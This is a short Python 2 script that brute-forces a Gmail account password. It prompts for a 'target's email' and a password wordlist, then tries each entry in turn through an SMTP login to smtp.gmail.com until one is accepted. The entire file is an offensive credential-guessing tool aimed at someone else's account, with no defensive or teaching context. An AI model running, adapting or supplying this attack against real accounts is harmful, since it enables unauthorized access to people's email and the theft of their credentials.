#!/usr/bin/python
# -*- coding: utf-8 -*-
import smtplib

smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("enter the target's email :")
passwfile = raw_input('enter the password file :')
passwfile = open(passwfile, 'r')

for password in passwfile:
    try:
        smtpserver.login(user, password)
        print '[+] password found ==> %s' % password
        break
    except smtplib.SMTPAuthenticationError:
        print '[!] password is incorrect ===> %s' % password

			
